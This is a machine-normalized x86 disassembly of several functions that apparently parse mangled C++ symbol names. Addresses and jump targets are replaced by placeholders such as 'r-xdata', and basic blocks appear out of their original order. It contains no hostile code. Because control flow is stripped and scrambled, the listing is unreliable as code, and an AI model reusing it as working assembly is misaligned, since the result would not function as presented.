mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub_4136e2
push ebp
mov ebp esp
sub esp 0x18
mov edx [ rw-data ]
push ebx
push esi
mov esi [ ebp - 0x4 ]
xor ebx ebx
and esi 0xffff0000
mov [ ebp - 0x8 ] ebx
inc edx
mov [ ebp - 0x4 ] esi
mov [ rw-data ] edx
push edi
mov cl [ edx ]
movsx edi cl
mov eax edi
sub eax 0x41
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
sub eax 0x1
je r-xdata
inc edx
mov [ rw-data ] edx
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
cmp [ eax ] 0x26
jne r-xdata
cmp [ ebp + 0x14 ] ebx
je r-xdata
sub eax 0x1
je r-xdata
mov eax [ ecx ]
cmp [ eax ] 0x2a
jne r-xdata
mov [ ecx ] r--data
mov edx [ rw-data ]
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push 0x3e
mov [ eax ] 0x1
call sub_410b80
push 0x2
mov eax [ ebp + 0xc ]
mov [ eax ] r--data
jmp r-xdata
test cl cl
je r-xdata
mov [ ecx ] r--data
mov edx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] bl
and [ eax + 0x4 ] 0xffff00ff
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc [ rw-data ]
jmp r-xdata
push 0x1
jmp r-xdata
mov al [ edx + 0x1 ]
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4108ad
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
lea ecx [ edi - 0x30 ]
add edx 0x2
shl ecx 0x4
add ecx 0xffffffd0
movsx edi al
add edi ecx
mov [ rw-data ] edx
cmp edi 0x1
jbe r-xdata
push 0x3e
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] esi
call sub_410f6c
mov eax [ rw-data ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
cmp [ eax ] 0x24
mov [ ebp - 0x4 ] ecx
jne r-xdata
push 0x2c
lea ecx [ ebp - 0x8 ]
call sub_410b80
push ebx
push edi
lea ecx [ ebp - 0x10 ]
call sub_410996
push eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410e7f
mov ebx [ eax ]
mov esi [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0x10 ]
push 0x5e
mov [ ebp - 0x10 ] edx
call sub_410f6c
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
inc eax
mov [ rw-data ] eax
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_411082
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
inc eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
or ecx 0x4000
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub_41388b
push ebp
mov ebp esp
sub esp 0x18
mov ecx rw-data
push esi
push 0x0
push 0x8
call sub_413de0
mov esi eax
test esi esi
je r-xdata
xor esi esi
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
jmp r-xdata
push esi
push [ ebp + 0x8 ]
call sub_413004
lea eax [ ebp - 0x10 ]
push eax
call sub_412fcb
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
add esp 0xc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
push 0x20
call sub_410f6c
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410e7f
mov ecx [ eax ]
mov [ esi ] ecx
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
sub_413904
push ebp
mov ebp esp
mov ecx [ rw-data ]
sub esp 0x38
mov al [ ecx ]
test al al
jne r-xdata
cmp al 0x36
jl r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_410e5b
add esp 0xc
cmp al 0x5f
je r-xdata
cmp al 0x39
jle r-xdata
mov esp ebp
pop ebp
retn
push ebx
movsx ebx al
sub ebx 0x36
inc ecx
mov [ rw-data ] ecx
cmp ebx 0x29
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_4108ad
jmp r-xdata
test ebx ebx
js r-xdata
mov al [ ecx ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
or ebx 0xffffffff
cmp ebx 0x3
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_410e5b
add esp 0xc
jmp r-xdata
movsx ebx al
sub ebx 0x3d
inc ecx
mov [ rw-data ] ecx
cmp ebx 0x4
jl r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0xffff0000
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ebx
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] eax
and edi 0x2
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_4108ad
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp ebx 0x7
jmp r-xdata
test bl 0x4
je r-xdata
cmp [ ecx ] 0x40
je r-xdata
pop ebx
jle r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
inc ecx
mov [ rw-data ] ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_4128ea
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_41110c
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_4128ea
pop ecx
mov ecx eax
call sub_410e7f
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_412452
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_41110c
call sub_412452
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x20
lea ecx [ ebp - 0x30 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_410f29
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
push 0x1
call sub_4108ad
mov ecx eax
call sub_410e7f
jmp r-xdata
cmp al 0x40
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x1
lea ecx [ ebp - 0x38 ]
call sub_4108ad
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
lea eax [ ebp - 0x30 ]
push eax
call sub_414a47
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x20
lea ecx [ ebp - 0x38 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_410f29
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
jmp r-xdata
push ebx
push 0x8
mov ecx rw-data
call sub_413de0
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x28
lea ecx [ ebp - 0x38 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push 0x29
mov [ ebp - 0x14 ] eax
call sub_410f6c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
xor ebx ebx
cmp [ esi ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
jmp r-xdata
mov eax [ rw-data ]
inc ecx
and eax 0x60
mov [ rw-data ] ecx
cmp al 0x60
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
mov al [ ecx ]
test al al
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov esi ebx
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] ebx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4108ad
call sub_415921
pop ecx
push eax
lea ecx [ ebp - 0x10 ]
call sub_41110c
jmp r-xdata
call sub_415921
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
shr ecx 0x13
lea eax [ ebp - 0x38 ]
not ecx
push eax
test cl 0x1
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x28 ]
push esi
push eax
call sub_414a18
lea eax [ ebp - 0x38 ]
push eax
call sub_412170
add esp 0xc
lea ecx [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x28
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push 0x29
mov [ ebp - 0x14 ] eax
call sub_410f6c
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410f29
mov ecx [ rw-data ]
mov eax ecx
and eax 0x60
cmp al 0x60
je r-xdata
call sub_414926
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_41110c
call sub_414926
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_410f29
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410f29
mov ecx [ rw-data ]
call sub_41595b
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_41110c
call sub_41595b
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_410f29
jmp r-xdata
mov eax [ rw-data ]
shr eax 0x8
not eax
test al 0x1
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
push 0x3
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
sub_413d21
push edi
mov edi [ ecx ]
test edi edi
jne r-xdata
mov eax [ edi ]
push esi
mov esi [ eax + 0x4 ]
mov ecx esi
call j_sub_40d4a2
mov ecx edi
call esi
pop esi
pop edi
retn
xor al al
pop edi
retn
sub_413d5e
push ebx
mov ebx ecx
push esi
push edi
mov edi [ ebx + 0x8 ]
mov eax [ edi ]
mov esi [ eax + 0x4 ]
mov ecx esi
call j_sub_40d4a2
mov ecx edi
call esi
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x4 ]
mov eax [ edi ]
mov esi [ eax + 0x4 ]
mov ecx esi
call j_sub_40d4a2
mov ecx edi
call esi
sub_413da3
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_413322
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x60
lea ecx [ ebp - 0x18 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
push 0x27
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
call sub_410ea1
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_413de0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
add esi 0x7
and esi 0xfffffff8
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
je r-xdata
test esi esi
jne r-xdata
push esi
mov esi [ edi ]
mov ecx esi
call j_sub_40d4a2
call esi
pop ecx
jmp r-xdata
mov eax [ edi + 0x10 ]
push ebx
cmp eax esi
jae r-xdata
push 0x8
pop esi
pop edi
pop esi
pop ebp
retn 0x8
sub eax esi
mov [ edi + 0x10 ] eax
mov ebx 0x1000
cmp esi ebx
ja r-xdata
xor eax eax
jmp r-xdata
push 0x1
push 0x1004
mov ecx rw-data
call sub_413de0
test eax eax
je r-xdata
pop ebx
xor eax eax
and [ eax ] 0x0
jmp r-xdata
mov ecx [ edi + 0xc ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov [ edi + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
add eax 0x4
add eax [ edi + 0xc ]
sub ebx esi
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] ebx
jmp r-xdata
sub_413e6e
mov ecx [ rw-data ]
mov al [ ecx ]
test al al
jne r-xdata
cmp al 0x30
jl r-xdata
xor eax eax
retn
xor edx edx
jmp r-xdata
cmp al 0x39
jg r-xdata
cmp al 0x40
jne r-xdata
movsx eax al
sub eax 0x2f
inc ecx
mov [ rw-data ] ecx
retn
test al al
je r-xdata
mov al [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp al 0x40
jne r-xdata
cmp al 0x41
jl r-xdata
or eax 0xffffffff
retn
mov eax edx
retn
cmp al 0x50
jg r-xdata
shl edx 0x4
movsx eax al
add edx 0xffffffbf
add edx eax
inc ecx
mov [ rw-data ] ecx
mov al [ ecx ]
sub_413ecf
push ebp
mov ebp esp
sub esp 0x28
mov ecx [ ebp - 0x4 ]
mov edx 0xffff0000
and [ ebp - 0xc ] edx
and ecx edx
push ebx
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edi
movsx eax [ esi ]
inc esi
mov [ ebp - 0x10 ] edi
mov [ rw-data ] esi
cmp eax 0x41
jg r-xdata
cmp eax 0x42
je r-xdata
je r-xdata
xor edi edi
inc edi
jle r-xdata
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x8 ]
push [ eax * 4 + r--data ]
call sub_410bf5
test edi edi
je r-xdata
test eax eax
je r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
je r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x5a
jle r-xdata
dec esi
mov [ rw-data ] esi
cmp eax 0x2f
jle r-xdata
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
or ecx 0x200
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4108ad
cmp eax 0x5f
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0x31
jle r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
movsx eax [ esi ]
inc esi
mov [ rw-data ] esi
cmp eax 0x4f
jg r-xdata
and [ ebp - 0xc ] edx
mov ebx edi
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
cmp eax 0x39
jg r-xdata
cmp eax 0x54
jg r-xdata
cmp eax 0x44
jge r-xdata
push edi
lea eax [ ebp - 0x28 ]
push edi
push eax
call sub_4160f0
add esp 0xc
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ rw-data ] esi
test ecx ecx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_4151da
pop ecx
push eax
lea eax [ ebp - 0x28 ]
push eax
push 0x3c
lea ecx [ ebp - 0x18 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_410f29
lea ecx [ ebp - 0x10 ]
call sub_413d21
cmp al 0x3e
jne r-xdata
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
cmp eax 0x56
jle r-xdata
cmp eax 0x53
jge r-xdata
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp eax 0x39
jg r-xdata
test ebx ebx
je r-xdata
cmp [ esi - 0x1 ] 0x31
jne r-xdata
push 0x3e
lea ecx [ ebp - 0x10 ]
call sub_410f6c
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push 0x20
lea ecx [ ebp - 0x10 ]
call sub_410f6c
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp eax 0x57
jle r-xdata
sub eax 0x50
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_410873
jmp r-xdata
cmp eax 0x3f
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410f29
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x7e
lea ecx [ ebp - 0x28 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi [ rw-data ]
cmp [ esi ] bl
jne r-xdata
mov [ eax ] 0x1
lea ecx [ ebp - 0x8 ]
call sub_410bf5
cmp eax 0x59
jle r-xdata
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x8 ]
push [ eax * 4 + r--data ]
call sub_410bf5
push edi
lea eax [ ebp - 0x28 ]
push edi
push eax
call sub_413ecf
add esp 0xc
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
test ecx ecx
je r-xdata
sub eax 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
movsx eax [ esi ]
inc esi
mov [ rw-data ] esi
test eax eax
je r-xdata
cmp eax 0x40
jle r-xdata
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x20 ]
push [ eax * 4 + r--data ]
call sub_410873
mov edx [ ebp - 0x1c ]
or edx 0x8000
test eax eax
je r-xdata
mov ebx [ ebp - 0x10 ]
inc esi
mov [ rw-data ] esi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
jmp r-xdata
cmp eax 0x5f
jne r-xdata
lea ecx [ ebp - 0x8 ]
test eax 0x400
je r-xdata
sub eax 0x1
jne r-xdata
cmp eax 0x30
jne r-xdata
cmp eax 0x42
jle r-xdata
cmp eax 0x2f
jle r-xdata
mov [ eax + 0x4 ] ecx
movsx eax [ esi ]
inc esi
mov [ rw-data ] esi
cmp eax 0x41
jl r-xdata
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x8 ]
push [ eax * 4 + r--data ]
call sub_410bf5
mov eax [ rw-data ]
mov al [ eax ]
test al al
jne r-xdata
push edi
push r--data
jmp r-xdata
cmp eax 0x43
jne r-xdata
cmp eax 0x36
jle r-xdata
cmp eax 0x44
jle r-xdata
movsx eax al
sub eax 0x30
js r-xdata
push 0x1
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
call sub_410f07
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_4150b8
mov edx [ ebp - 0x1c ]
add esp 0xc
or edx 0x1000
jmp r-xdata
push 0x1
push r--data
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp eax 0x38
jg r-xdata
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp eax 0x46
jle r-xdata
cmp eax 0x5
jae r-xdata
mov ecx [ ebp - 0x20 ]
jmp r-xdata
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x18 ]
push [ eax * 4 + r--data ]
call sub_410873
mov eax [ rw-data ]
cmp [ eax ] 0x3f
lea eax [ ebp - 0x28 ]
push eax
jne r-xdata
cmp eax 0x4a
jle r-xdata
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x10 ]
call sub_410bf5
mov ecx [ rw-data ]
movsx eax [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp eax 0x30
je r-xdata
call sub_415192
pop ecx
push eax
lea ecx [ ebp - 0x18 ]
call sub_410f29
call sub_4130d6
pop ecx
push eax
lea ecx [ ebp - 0x18 ]
call sub_410f29
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
cmp eax 0x4b
jne r-xdata
lea eax [ ebp - 0x28 ]
push edi
push eax
call sub_413004
mov eax [ ebp - 0x28 ]
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
push 0x20
mov [ ebp - 0x14 ] eax
call sub_410f6c
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_410f29
lea ecx [ ebp - 0x20 ]
jmp r-xdata
cmp eax 0x31
je r-xdata
push r--data
lea ecx [ ebp - 0x18 ]
call sub_411021
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x14 ]
jmp r-xdata
inc eax
mov [ rw-data ] eax
jmp r-xdata
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x20 ]
push [ eax * 4 + r--data ]
call sub_410873
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_410e7f
jmp r-xdata
mov eax [ ebp - 0x8 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_410f29
push 0x2c
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_414f20
pop ecx
mov ecx eax
call sub_410ea1
push eax
lea ecx [ ebp - 0x18 ]
call sub_410f29
push 0x2c
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_414f20
pop ecx
mov ecx eax
call sub_410ea1
push eax
lea ecx [ ebp - 0x18 ]
call sub_410f29
push 0x2c
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_414f20
pop ecx
mov ecx eax
call sub_410ea1
push eax
lea ecx [ ebp - 0x18 ]
call sub_410f29
push 0x29
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x20 ]
push edi
push eax
call sub_413322
pop ecx
pop ecx
mov ecx eax
call sub_410ea1
push eax
lea ecx [ ebp - 0x18 ]
call sub_410f29
push 0x27
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_410ea1
jmp r-xdata
add eax 0xffffffce
cmp eax 0x2
jbe r-xdata
mov ecx [ rw-data ]
mov al [ ecx ]
test al al
jne r-xdata
dec ecx
mov [ rw-data ] ecx
jmp r-xdata
cmp al 0x40
je r-xdata
cmp al 0x40
jne r-xdata
push 0x1
inc ecx
mov [ rw-data ] ecx
inc ecx
mov [ rw-data ] ecx
lea ecx [ ebp - 0x20 ]
push eax
call sub_410f6c
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x20 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x1c ]
jmp r-xdata
sub_414531
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ rw-data ]
mov edx 0xffff0000
and [ ebp - 0x4 ] edx
push esi
push edi
movsx eax [ ecx ]
xor edi edi
mov [ ebp - 0x8 ] edi
sub eax edi
je r-xdata
push [ ebp + 0xc ]
sub eax 0x24
je r-xdata
mov al [ ecx + 0x1 ]
cmp al 0x24
je r-xdata
mov esi [ ebp + 0xc ]
sub eax 0x1d
je r-xdata
mov esi [ ebp + 0xc ]
add ecx 0x2
mov [ rw-data ] ecx
movsx eax [ ecx ]
cmp eax 0x51
jg r-xdata
test al al
je r-xdata
push r--data
sub eax 0x1
je r-xdata
sub eax 0x52
je r-xdata
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_4108ad
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push r--data
lea ecx [ ebp - 0x8 ]
call sub_410bf5
cmp [ esi ] edi
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_4124eb
push r--data
lea ecx [ ebp - 0x8 ]
call sub_410bf5
cmp [ esi ] edi
je r-xdata
sub eax 0x1
je r-xdata
push r--data
jmp r-xdata
sub eax edi
je r-xdata
mov ecx [ rw-data ]
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_410f6c
mov ecx [ rw-data ]
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_410f6c
inc ecx
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x1
je r-xdata
mov eax [ esi ]
inc ecx
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x4 ]
or eax 0x100
mov [ rw-data ] ecx
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_41480e
add esp 0x10
jmp r-xdata
push esi
jmp r-xdata
sub eax 0x41
je r-xdata
inc ecx
mov [ rw-data ] ecx
mov ecx [ ebp + 0x8 ]
push r--data
call sub_410873
jmp r-xdata
sub eax 0x5
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_410e5b
push esi
push [ ebp + 0x8 ]
inc ecx
mov [ rw-data ] ecx
call sub_413904
jmp r-xdata
sub eax 0x1
je r-xdata
push [ ebp + 0x8 ]
inc ecx
mov [ rw-data ] ecx
call sub_414e25
jmp r-xdata
pop ecx
push 0x1
push esi
push [ ebp + 0x8 ]
inc ecx
mov [ rw-data ] ecx
call sub_41470c
jmp r-xdata
sub eax 0x1
jne r-xdata
pop ecx
jmp r-xdata
add esp 0xc
and [ ebp - 0x4 ] edx
lea eax [ ebp - 0x8 ]
push edi
push eax
push r--data
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] edi
inc ecx
push esi
push eax
mov [ rw-data ] ecx
call sub_4129a9
push eax
push [ ebp + 0x8 ]
call sub_4124eb
add esp 0x1c
jmp r-xdata
sub_41470c
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x18
mov cl [ eax ]
test cl cl
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_410e5b
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ eax ] 0x59
jne r-xdata
cmp cl 0x58
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push esi
push eax
call sub_4124eb
test [ esi + 0x4 ] 0x4000
pop ecx
pop ecx
je r-xdata
push [ ebp + 0xc ]
inc eax
push [ ebp + 0x8 ]
mov [ rw-data ] eax
call sub_412250
pop ecx
pop ecx
jmp r-xdata
cmp cl 0x5f
jne r-xdata
inc eax
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
test [ esi + 0x4 ] 0x2000
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1 ] cl
jne r-xdata
push eax
push r--data
push [ ebp + 0x8 ]
call sub_410e37
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
call sub_410873
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
